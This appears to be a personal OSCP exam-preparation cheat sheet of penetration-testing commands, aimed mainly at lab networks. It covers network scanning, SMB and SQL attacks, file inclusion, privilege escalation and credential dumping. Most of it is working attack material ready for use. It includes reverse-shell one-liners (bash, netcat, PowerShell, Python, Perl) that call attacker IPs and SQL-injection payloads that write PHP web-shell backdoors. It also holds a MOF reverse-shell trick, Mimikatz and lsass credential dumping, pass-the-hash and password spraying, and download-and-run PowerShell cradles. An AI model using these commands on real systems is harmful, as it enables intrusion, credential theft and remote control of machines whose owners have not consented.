# OSCP
Links:
- https://github.com/0x4D31/awesome-oscp 
- https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#preperation
- https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97

## Discovery
- Host discovery TCP:   
   `TOPTCP="$(grep -E "^[^#]*/tcp" /usr/share/nmap/nmap-services | sort -k 3nr | cut -f2 | cut -f1 -d/ | head -1000 | tr '\n' ',')"`   
   `nmap -n -sn --reason -PR -PE -PP -PM -PO -PY -PA -PS"$TOPTCP" -PU -iL targets.txt -oA nmap_host_discovery_arp_icmp_ip_sctp_tcp_udp`  
   Options explained:  
   TOPTCP: Variable containing the top 1000 ports  
   -n: No DNS lookups  
   -sn: No portscan  
   --reason: Show why nmap says this host is online  
   -PR: Host discovery using ARP requests for hosts which are in the same subnet  
   -PE: Host discovery using ICMP echo request  
   -PP: Host discovery using ICMP timestamp request  
   -PM: Host discovery using ICMP netmask request  
   -PO: Host discovery by sending various IP protocols (ICMP, IGMP and IP-in-IP)  
   -PY: Host discovery by sending SCTP packets.  
   -PA: Host discovery by sending a TCP ACK packet to port 80 (if the host is online, it should reply with a RST packet if this is not firewalled).  
   -PS: Host discovery by sending TCP SYN packet to the $TOPTCP ports. This is done with a variable, because the --top-ports option is ignored for host discovery. If the host is online and the port is open, a SYN/ACK packet is replied. If the host is online but the port closed, a RST packet is returned.  
   -PU: Host discovery by sending a UDP packet to the port 40125. (If the host is online and the port closed, an ICMP Port Unreachable packet is returned if this is not firewalled).  
   -oA: Write output to file  
   
   Add discovered hosts to textfile:  
   `awk '/Up$/{ print $2 }' nmap_host_discovery_arp_icmp_ip_sctp_tcp_udp.gnmap | sort -V > targets_online.txt`   
- Host / Service discovery UDP:   
   Get top 100 UDP ports:  
   `grep -E "^[^#]*/udp" /usr/share/nmap/nmap-services | sort -k 3nr | cut -f2 | cut -f1 -d/ | head -100 > udp_ports`   
   Get all UDP ports that have a payload that is sent by nmap. The chances are higher, that you will get a response when nmap sends a valid payload and the port is then treated as definitively open (instead of filtered|open when no response was received):  
   `grep ^udp /usr/share/nmap/nmap-payloads | cut -d " " -f2 | tr , '\n' | sort -un >> udp_ports`   
   Get all UDP ports that have a nmap-script. The chances are again higher that you will receive a response when the script is executed:  
   `grep -l -E "categories.*default" /usr/share/nmap/scripts/* | xargs grep -h -E "portrule.*udp" | grep -o -E "[0-9]+" >> udp_ports`   
   Assign them to a variable:  
   `UDPPORTS="$(sort -un udp_ports | tr '\n' ,)"`   
   Start scanning:  
   `nmap -n -Pn --reason -sU -sC -p "$UDPPORTS" -iL targets.txt --excludefile targets_online.txt -oA nmap_host_discovery_udp_service_scan`   
   Now add hosts with open UDP Ports to targets_online.txt:   
   `awk '/\/open\//{ print $2 }' nmap_host_discovery_udp_service_scan.gnmap  >> targets_online.txt`   

- Full TCP service scan on found hosts:  
   `nmap -n -Pn --reason -sS -sC -sV -p- -O -iL targets_online.txt -oA nmap_service_scan_tcp`
 
- If you want only open ports without all the details:  
   `nmap -n -Pn --reason -sS -p- -iL targets_online.txt -oA nmap_service_scan_tcp`

- start with less ports until full scan is done:  
   `nmap -n -Pn --top-ports 100 --reason -sS --min-hostgroup 128 --max-retries 1 --min-rate 500 --defeat-rst-ratelimit -iL targets_online.txt -oA nmap_SYN_scan_TCP_TOP_100`  

- NMAP Reports:  
   https://github.com/maaaaz/nmaptocsv  
   `python nmaptocsv.py -x SMBClientScan.xml -f ip-port-protocol-service-version-os >> output.csv` 

- NMAP based OS Discovery:  
   `nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery <ipaddress>` 

- Discovery & Data Gathering tools:
  `https://github.com/codingo/Reconnoitre` 
  
- Replace nmap with netcat:  
  `nc -z -v {host-name-here} {port-range-here}`  
  `nc -nvv -w1 -z 10.X.X.Y 1-100 2>&1 | grep open`  
  ``for port in `seq 65535`; do { disown -r ; nc -nvv -w1 -z 10.X.X.Y $port 2>&1 | grep ' open' & } 2>/dev/null ; disown -r ; done``  

## HTTP/HTTPS
- `curl -i <ip>`   
- `nikto -host $targetip -port $targetport`
- `./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $targetip -e php`
- `gobuster dir -e -k -w /usr/share/wordlists/dirb/common.txt -r -u https://www.example.com` 
   `gobuster with cookies: gobuster dir -e -k -w /usr/share/wordlists/dirb/common.txt -c 'connect.sid=s%3AEKo...jYluY; JSESSIONID=3asdasd889DF94A;' -r -u  https://somedomain.com`
- gobuster comprehensive busting:
  `gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'`  
- gobuster search with file extension:
  `gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php`  

- Wordpress scan:
  `wpscan -u 10.10.10.10/wp/` 
  
- Login pages:  
  Username enumeration through  
  - Checking login failed message  
  - Registering account (try same email twice, same username twice)  

- PHP Logfile contamination:  
  (add the PHP code to the logfile and the with LFI get the logfile somewhere where "include PHP function" is being used)
  `kali@kali:~$ nc -nv 10.11.0.22 80`  
  `(UNKNOWN) [10.11.0.22] 80 (http) open`  
  `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`  
  Use the PHP code in the logfile:  
  `http://10.11.0.2/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`  

- Aquatone Installation:
   `wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip` 
   `unzip aquatone_linux_amd64_*.zip -d /opt/aquatone/` 
   If google chrome is not yet installed:  
   `echo "deb [arch=amd64] https://dl.google.com/linux/chrome/deb/ stable main" > /etc/apt/sources.list.d/google-chrome.list` 
   `wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -` 
   `apt-get update` 
   `apt-get install google-chrome-stable` 
   Aquatone Usage:  
   Collect data based on nmap report: `cat nmap.xml | /opt/aquatone/aquatone -nmap -chrome-path /usr/bin/google-chrome -out screenshots -ports xlarge` 
   Run Aquatone on list of IPs with specific ports: `cat ips.txt | /opt/aquatone/aquatone -chrome-path /usr/bin/google-chrome -out screenshots -ports 25,80,161,264,443,2001,3478,4999,5222,6080,8443,18264,27299,38751`  

- https://guif.re/webtesting
- https://sushant747.gitbooks.io/total-oscp-guide/common_web-services.html 

## SMB
- `nmap -p 139,445 --script=smb-vuln* $targetip`  
- `enum4linux -a $targetip`  
- `smbclient \\\\$ip\\$share`  
- `smbmap -H <IPAddress>`  
- `nbtscan`  
- `crackmapexec smb 10.11.1.1/24`
- Null connect:
  `rpcclient -U "" 10.10.10.10` 
- Try known creds on targets: `crackmapexec smb 10.11.1.1/24 -u Administrator -p 99bbVDdorGzfZJun`  
- Bruteforcing: `crackmapexec smb 10.11.1.1/24 -u /ville/Desktop/OSCP/PWK/users.txt -p /ville/Desktop/OSCP/PWK/pws.txt`  

Get files from SMB share:  
- /usr/share/doc/python-impacket/examples# python smbclient.py 10.11.1.136  
- `shares` --> list shares  
- `use <share>` --> use share xyz   
- `get <file>` --> download file  
Or with smbget:  
- `smbget -R smb://1.1.1.1/folder`  

Transfer files from the Kali VM with smbserver.py:  
- `python /usr/lib/python2.7/dist-packages/impacket/smbserver.py share /root/Desktop/OSCP/SMB/SMBServer/`  
- on the Windows target, get the connection to the share with e.g.: `net use \\<kali-ip>\share`  
- copy the file from the remote target to the kali: `copy file.txt \\<kali-ip>\share\


## WinRM
- WinRM from Linux: https://github.com/Hackplayers/evil-winrm  
  `# ruby evil-winrm.rb -i 10.10.10.169 -u Hans -p 'Wurst123!' -s /opt/PowerSploit/Privesc/`  
  `*Evil-WinRM* PS C:\Users\Hans\Documents> PowerUp.ps1`  
  Now, locate all imported functions with "menu"   

## NFS
 - `nmap -p 111 --script=nfs* -iL nfstargets.txt`  
   example output:  
   `PORT    STATE SERVICE`  
   `111/tcp open  rpcbind`  
   `| nfs-ls: Volume /home`  
   `|   access: Read Lookup NoModify NoExtend NoDelete NoExecute`  
   Mount the dir:  
  `mkdir nfsmount; sudo mount -o nolock 10.11.1.72:/home ~/nfsmount/`  

## FTP
- First check for anonymous access  
  `ftp $targetip`  
  `Username: anonymous`  
  `Password: anything`  

Path traversal: 
- FTP: `ftp://10.11.1.125/../../../../windows/system32/wbem/logs/mofcomp.log`  

## DNS 
- DNS Zone transfer lookup  
  `host -l <domain> <nameserver IP address>`  
  (e.g.: host -l megacorpone.com 38.100.193.80)  
  this might provide additional information about the network, listing hostnames and ip addresses  

## SSH
- "unable to negotiate with ... no matching key ex found" --> add to config:   
  `# cat /root/.ssh/config`  
  `host 10.11.1.252`   
     `KexAlgorithms +diffie-hellman-group1-sha1`  
     `PubkeyAcceptedKeyTypes=+ssh-dss`  

- "xxxx must be run from a terminal" --> spawn terminal:
   1. `echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py` 
   2. `python /tmp/asdf.py` 
- SSH Tunnel (Source --> public ip 1.1.1.1 --> machine with private ip 2.2.2.2) to RDP to internal VM (2.2.2.2)  
  `ssh -l <username-on-1.1.1.1> (-i key.txt) -L 1337:2.2.2.2:3389 1.1.1.1`  
  afterwards you can RDP to the internal VM with: localhost:1337  
- SSH Tunnel with SSHuttle:  
  `sshuttle -vvr user@10.10.10.10 10.1.1.0/24` 
  With SSH Key:  
  `sshuttle -vr root@10.10.10.13 172.16.1.0/24 --ssh-cmd 'ssh -i sshloginkey.txt'`  
  Now all traffic to 172.16.1.0/24 will be sent to the tunnel

## SMTP
- check if user exists:  
  `nc -nv <ip address> 25`  
  `VRFY <username>`  
  automate with bash:  
  `for user in $(cat users.txt); do echo VRFY $user | nc -nv -w 1 192.168.100.100 25 2>/dev/null | grep ^"250";done` 

## SNMP
- `snmp-check 10.10.10.10`  

## Exploits / Searchsploit
- Update Searchsploit
  `searchsploit -u`  
- Search exploit  
  `searchsploit $multiple $search $terms` 

## SQL Injection
SQLMap
- Use saved request from burp: (-p is parameter, can be removed if you add * to the param in the request file)  
  `sqlmap -r request.txt -p objectid --risk 3 --level 5` 
- SQLMap Crawl:  
  `sqlmap -u http://10.10.10.10 --crawl=1`
- SQLMap Dump DB:  
  `sqlmap -u http://10.10.10.10 --dbms=mysql --dump` 
- SQLMap Shell:  
  `sqlmap -u http://10.10.10.10 --dbms=mysql --os-shell` 
- SQL Shell through UNION based SQL Injection in "TextBoxUsername" field:  
  `sqlmap -r request.txt -p TextBoxUsername --sql-shell --technique=U`  
- Search for columns with the name password   
  `python sqlmap.py -u "http://192.168.1.1/mypath/mypoorlywrittenapp.asp?SessionID=" --time-sec=1 --search -C 'password'`  

Bypasses  
  `' or 1=1;#`  (MySQL/MariaDB)
  `' or 1=1 LIMIT 1;#`  (MySQL/MariaDB) --> If e.g. login expects only one entry in returned query
  `' or 1=1 LIMIT 1 --`  
  `' or 1=1 LIMIT 1 -- -`  
  `' or 1=1 LIMIT 1#`  
  `' or 1#`  
  `' or 1=1 --`  
  `' or 1=1 -- -`  

Queries
- Upload php command injection file:  
  `union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'`  
- Load file:  
  `union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6` 

MSSQL 
- Nmap scripts with db credentials:  
  `# nmap -n -Pn -p1433 --script "ms-sql-* and not ms-sql-brute" --script-args mssql.username=sa,mssql.password=<pw> 10.11.1.31`  
- Impacket mssqlclient.py:   
  `mssqlclient.py HOSTNAME/USERNAME:'PASSWORD'@10.10.10.22 -windows-auth`   
  Check if the user is sysadmin:   
  `SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')`  
  `-----------`   
  `1`  
  Run OS commands through xp_cmdshell:  
  `SQL> EXEC sp_configure 'xp_cmdshell', 1`  
  `[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.`  
  `SQL> reconfigure;`  
  `SQL> xp_cmdshell "whoami"` 
  `[...]`  
  `hostname\sql_svc`  
  Using PowerUpSQL:  
  `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')`  
  `$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username "domain\user" -password "passw0rd123" | Where-Object {$_.Status -like "Accessible"}`  
`Invoke-SQLAudit -Verbose -Instance "servername.domain.local,1433"`  
  SMB Relay through xp_dirtree:  
  Run responder on kali with `/opt/Responder/Responder.py -I eth0 -w -r -f -d`   
  Initiate connection on xp_dirtree vulnerable sql server: `Get-SQLQuery -Verbose -Instance "servername.domain.local,1433" -Query "EXEC master.sys.xp_dirtree '\\<kali-ip>\test123'"`   
  
MySQL 
- Enumerate tables:  
  `http://10.11.14.101/comment.php?id=769 union all select 1,2,3,4,table_name,6 FROM information_schema.tables` 
- Get columns of specific table:  
  `http://10.11.14.101/comment.php?id=769 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'` 
- Get content of table:  
  `http://10.11.14.101/comment.php?id=769 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users`  
- Create new php file with cmd.exe:  
  `http://10.11.14.101/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'`  
- Use the new page with params:  
  `http://10.11.14.101/backdoor.php?cmd=whoami`  

## File inclusion
- LFI: http://target.com/?page=home --> http://target.com/?page=./../../../../../../../../../etc/passwd%00
- RFI: http://target.com/?page=home --> http://target.com/?page=http://hackerip/evil.txt%00
- With LFI, data wrappers can be used:
  `http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>`  

## Reverse Shells
Linux:
- Pipe /bin/sh back to 10.0.0.1 port 1234:  
  `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f ` 
- More: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  
- `nc -e /bin/sh 10.10.10.10 4443` 
- `bash -i >& /dev/tcp/10.10.10.10/443 0>&1`  

Windows:
- nc.exe on Windows:  
  `nc.exe -e cmd.exe attackerip 1234` 
- PowerShell:  
  `powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` 
- Python:  
  `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`  
- Perl:  
  `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'` 

PHP:
- First modify the post request parameters to create a php file which executes the shell:  
  `q=test&lang=en' union select all 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/newbackdoor.php';#`  
  afterwards run the command to spawn a reverse shell:  
  `http://10.11.14.101/newbackdoor.php?cmd=c:\users\offsec\desktop\tools\netcat\nc.exe -nv 10.11.0.90 443 -e cmd.exe` 
- Alternative:  
  `<?php echo system($_GET["cmd"]);?>` 

## Info Gathering 
### Windows
- PS History: `cat (Get-PSReadlineOption).HistorySavePath`  
- `type C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`  
- `Get-ScheduledTask| % { $_.Actions}` 
- `schtasks /query /v /fo LIST`  
- IIS App Pool Creds: `(ls IIS:\AppPools | Get-ItemProperty -Include ProcessModel).ProcessModel | select UserName,Password`  
- psexec.py Login with account:  
`psexec.py administrator@10.10.10.10`  

### Active Directory
- Query AD without PS AD Modules  
  List Global Catalogs of a forest:
   `([System.DirectoryServices.ActiveDirectory.Forest]::Getcurrentforest()).GlobalCatalogs`  
- User Enumeration  
   https://github.com/sensepost/UserEnum

### Network
- run wireshark, save dump --> `./Pcredz -f dump.pcap`  
  or: `sudo ./net-creds.py -p dump.pcap` 

### MySQL command line
- using found credentials:   
  ` mysql -uroot -p<pass> -e 'show databases;'`   
## crackmapexec
- "hash spraying" (in this case with local administrator)  
   `cme smb 172.16.1.0/24 -u Administrator -H 7facdc498ed1680c4fd1448319a8c04f --local-auth` 
- Share enumeration with credentials:  
  `cme smb 172.16.1.0/24 -u bill -p 'password' --shares` 
## Kerbrute   
- Very performant password spraying tool:   
  `# ./kerbrute_linux_amd64 passwordspray --dc 10.10.10.1 -d example.net userlist.txt 'F00B@r23!'`   

## File Transfer
### PowerShell
- `Invoke-RestMethod -Uri $uri -Method Post -InFile $uploadPath -UseDefaultCredentials` 
- `IEX ((New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"))`  
- `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"`  

### Download base64 encoded file   
- `[System.IO.File]::WriteAllBytes("c:\windows\temp\telem.exe",[System.Convert]::FromBase64String((New-Object Net.Webclient).downloadstring("https://XOURDOMAIN.COM")))`   

### netcat
- transfer files from kali to windows:  
   1. open listener on target: `nc -nlvp 4444 > incoming.exe` 
   2. send file to target:  `nc -nv 10.0.0.22 4444 < /usr/share/windows-binaries/wget.exe` 
- transfer files from windows to kali:  
   1. on Kali: `nc -nlvp 4444 > file.txt` 
   2. on Windows: `nc.exe -10.11.0.90 4444 < c:\users\bla\file.txt` 

### Impacket
- connect smbclient.py with hash:   
  `/usr/share/doc/python-impacket/examples/smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:175a592f3b0c0c5f02fad40c51412d3a Administrator@10.11.1.202` 
- get shares: `shares` 
- upload something to c$:  
  `use C$`  
  `put /var/www/html/transfer/nc.exe` 

### Download with SCP
- when having SSH key to remote target, download file with:  
  `scp -i mysshprivatekey user@10.10.10.10:/home/myuser/filename /home/folder/targetfilename`  

### SSH copy
- file: `scp -p 192.168.1.100:/root/filetocopy targetfile` 
- directory: `scp -r root@192.168.1.100:/var/log ~/backup-logs`  

### Others
- `smbget -R smb://1.1.1.1/folder` 
- LOLBins Windows: https://lolbas-project.github.io/
- LOLBins Linux: https://gtfobins.github.io/

## PrivEsc Windows
- https://github.com/itm4n/PrivescCheck   
- missing patches:   
  https://github.com/rasta-mouse/Sherlock   
  https://github.com/rasta-mouse/Watson   

- Add new admin:
  `net user /add [username] [password]`  
  `net localgroup administrators [username] /add` 

- `IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")`  
  `Invoke-AllChecks`
  
- Search for passwords in ini,xml and txt files:  
  `findstr /si password *.xml *.ini *.txt`  
  
- Check services:  
  `wmic service get name, displayname, pathname, startname`  
  Check insecure service permissions:  
  `accesschk.exe -accepteula -uwcqv "Authenticated Users" *`  

- Check Privileges with: `whoami /priv`  
  If User has `SeImpersonate` or `SeAssignPrimaryToken` (most often service accounts!) you can get to SYSTEM by using the "potato": https://github.com/ohpe/juicy-potato  
  For IIS: https://www.youtube.com/watch?v=wK0r-TZR7w8&feature=emb_title  
  For SQL Server: https://www.youtube.com/watch?v=3CPdKMeB0UY&feature=emb_title 
  
If you have path traversal plus a location with write access you can exploit that with a malicious MOF file:  
1. Generate MOF template with msf module "exploit/windows/smb/psexec":  
  msf5 exploit(windows/smb/psexec) > `irb`  
  [ ... ] >>`puts generate_mof("Specialclass","ToOpenReverseShell")`  
2. Copy it to a MOF and replace the following line  
  `ScriptText = "\ntry {var s = new ActiveXObject(\"Wscript.Shell\");\ns.Run(\"ToOpenReverseShell\");}`  
  with:  
  `ScriptText = "\ntry {var s = new ActiveXObject(\"Wscript.Shell\");\ns.Run(\"nc -e cmd 10.11.0.90 9001\");}`  
3. Transfer the nc.exe to the targets C:\windows\system32  
4. Start netcat listener on kali (same port as above in code!)
5. Transfer the MOF file:  
  `put filename.mof ../../../../windows/system32/wbem/mof/Specialclass.mof`  
  --> This will provide you with a reverse shell!

- Error "This program cannot be run in DOS mode."  
  When you get this error in a shell when trying to run uploaded files through FTP, try to first change the mode to binary, before you PUT the file:  
  `ftp> binary`  
  `200 Type set to I.`  
  `ftp> put accesschk.exe` 
  `[ ... ]` 
  `150 Opening BINARY mode data connection for accesschk.exe.`  
  `226 Transfer complete.`  
  
## PrivEsc Linux
- First look for obvious fails, like: 
  - writable etc/passwd or exports 
  - readable etc/shadow. ssh keys, bash history, cronjobs
  - suid binaries --> `find / -perm -u=s -type f 2>/dev/null`  
    PrivEsc using suid: https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/  
  - editable/vulnerable service binaries  
- Good tools to aid are linux-exploit-suggester.sh, LinEnum, LinuxPrivChecker, PowerUp and pspy  

- ltrace: shows parameters of invoked functions and system calls.  
  example: `# ltrace -s 1000 ./filearchiver`  
  `__libc_start_main(0x80483f0, 1, 0xbfdf8a84, 0x8048440 <unfinished ...>`  
  `puts("Archiving files to server..."Archiving files to server...`  
  `)                                      = 36`  
  `system("scp -r file/tobearchived/* 100.101.110.100:/var/www/html/files/"`  
  --> this provides us with the information, that this tool runs "scp" without path!

- Spawn bash shell with python:  
  `python -c 'import pty;pty.spawn("/bin/bash")'`  
  (if python3 --> python3 -c "import pty; pty.spawn('/bin/bash')"`  
  `python -c 'import pty; pty.spawn("/bin/sh")'`  
  
  make the reverse shell more usable (with autocomplete etc.):  
  `ctrl + z`  
  `stty raw -echo; fg`  

## TCPDUMP 
- capture traffic from specific port:  
  `tcpdump -s 0 port ftp or ssh -i eth0 -w mycap.pcap`  
  `tcpdump -s 0 port 3389 -i eth0 -w mycap.pcap`  

## Searching stuff
- search folder and subfolders for a string, output results and save results to file:   
  `grep -ria @emaildomain.com /mnt/leaks_unpacked/ | tee /root/Desktop/85390/search_emaildomain.out` 
- searching the home directories on linux:  
  `ls -ahlR /home `  
- get full path to file  
  `realpath key.pem`  
- Comparison: get all entries of file2 with are not already in file1:  
  `awk 'FNR==NR{a[$0]=1;next}!($0 in a)' file1 file2`  
- get all unique entries from multiple files and save them to new file:  
  `awk '!a[$0]++' folderwithfiles/* > uniqueentries.txt`  
- find all files with specific ending (recursive) and copy them to a target directory:  
  `find ./ -name "*.burp" -ls -exec cp {} /mnt/hgfs/transfer/targetfolder/ \;`  
  `./` --> means from the current directory and subfolders  
  `-exec` --> with the results from the find command (being {} ), execute the following command  
- Get specific lines of nmap report, e.g. systems with specific port open:  
  `cat TCP-SYN-scan_11-06-19_02-45-50.txt | grep -E "Nmap scan report for|445/tcp open"`  
  `cat nmap_SYN_scan_TCP_TOP_100.nmap | grep -E "Nmap scan report|open" | grep -B1 open`  
- If number of spaces between port and status is different: (Note: there is a space between the brackets!)  
  `cat TCP-SYN-scan_11-06-19_04-59-05.txt | grep -E "80/tcp[ ]+open"`  
- Get last two regex occurences of string, e.g. to return only "domain.topleveldomain" from a long list which includes subdomains:  
  `grep -E "[A-Za-z0-9\-]+\.[A-Za-z0-9\-]+$" --color -o urls.txt | sort -u`  
- another method:  
  `cat domains.txt | rev | cut -d. -f 1-2 | rev`  
- get client IPs from apache access.log and group them:  
  `cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn`  

## Creating lists
- add domain name to the beginning of each user in a users.txt file:  
  `# sed -e 's/^/THINC\\/' /root/Desktop/OSCP/usernames.txt > /root/Desktop/OSCP/domainusers.txt`  

## Pass-the-Hash techniques
- Dump creds with Impacket:  
  `secretsdump.py ralph/user1@10.11.1.31 -hashes aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f`  
- open cmd.exe on remote target with known hash:  
  `/usr/share/doc/python-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:175a592f3b0c0c5f02fad40c51412d3a Administrator@10.11.1.202 cmd.exe`  
- Open remote connection with known hash using wmiexec:  
  `wmiexec.py ralph/user1@10.11.1.31 -hashes aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f`  

## Mimikatz
- First Mimikatz commands: (run always)  
  `mimikatz # privilege::debug`  
  `mimikatz # log sekurlsa.log`  
- logonpasswords:  
  `mimikatz # sekurlsa::logonpasswords`  
- other way:  
  `mimikatz # token::elevate`  
  `mimikatz # lsadump::secrets`  
- Use minidump file:  
  `mimikatz # sekurlsa::minidump C:\WINDOWS\Temp\debug7962.bin`  
- PW Dump oneliner: `mimikatz.exe privilege::debug sekurlsa::logonPasswords exit > output.txt`
- Start shell with NTLM hash of user:  
  `mimikatz # sekurlsa::pth /user:admin-kiwi /domain:comp-internal /ntlm:cc36cf7a8514893efccd332446158b1a /run:cmd`  
- Possible attack sequence with metasploit:  
  1. Run Metasploit's "hashdump" to get hashes: `hashdump`  
  2. Start a process under the desired identity: `mimikatz sekurlsa::pth /user:Administrator /domain:. /ntlm:… /run:"powershell -w hidden"`  
  3. In Metasploit, abuse the security token of the just spawn process: `steal_token 1234`  
  4. Do now whatever you want in metasploit with these privileges (e.g. list\\target\c$, upload and run binaries, perform WMIC commands, ...)
- Create minidump: (easiest with right click in taskmgr)  
  `procdump64.exe -accepteula -ma lsass.exe lsass.dmp`  
   Remote: `psexec.py -c procdump64.exe 'example.com/username:P@ssw0rd@foobar.example.com' '-accepteula -ma lsass.exe c:\lsass.dmp'`  
- On Kali, you can use pypykatz to extract the creds from the lsass.dmp:  
  Install pypykatz:  
  `# pip3 install pypykatz`  
  Extract the creds from the lsass.dmp:   
  `# pypykatz lsa minidump lsass.dmp`  
    
## Bypass Applocker
- Bypass Applocker with mimilib.dll to run arbitrary executables:  
  `rundll32 c:\path\mimilib.dll,start d:\otherpath\a.exe`  

## Metasploit
- Multihandler:
  `msf>use exploit multi/handler`  
  `msf>set payload windows/meterpreter/reverse_tcp`  
  `msf>set lhost <local IP>`  
  `msf>set lport <local port>`  
  `msf>set ExitOnSession false`  
  `msf>exploit -j`  
- MSF Payload:  
  `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.90 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows`  
- Vuln Scanning with MSF:  
  make sure db runs: `db_status`  
  `db_nmap -v -sV 10.11.1.35`  
  `db_nmap -sS -Pn -A 10.11.1.35`  

## Linux RDP Client
- `rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.10.10.10`  

## start webserver
- `python -m SimpleHTTPServer 80`  
- `python3 -m http.server 7331`  
- `php -S 0.0.0.0:8000`  
- `ruby -run -e httpd . -p 9000`  
- `busybox httpd -f -p 10000`  

## start FTP server
- Install pyftpdlib  
  `pip install pyftpdlib`  
  Run (-w flag allows anonymous write access)  
  `python -m pyftpdlib -p 21 -w` 

## Compiling
- Compiling a C program:  
  `gcc -static -mpreferred-stack-boundary=2 -o Shell ShellSpawn.c`  
  `gcc -o Shell ShellSpawn.c`


## Buffer Overflows etc.
### Patterns
- Create a unique pattern of 2700 byte:  
  `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700`  
- locate a hex offset pattern:  
  `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438 -l 2700`  

### Badchars
- generate all possible hex chars:  
  `cat badchars.py`  
  `#!/usr/bin/python`  
  `import sys`  
  `for x in range(1,256):`  
  `sys.stdout.write("\\x" + '{:02x}'.format(x))`  
- Badchars:  
  Bad characters
  `badchars = (`  
  `"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"`  
  `"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"`  
  `"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"`  
  `"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"`  
  `"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"`  
  `"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"`  
  `"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"`  
  `"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"`  
  `"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"`  
  `"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"`  
  `"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"`  
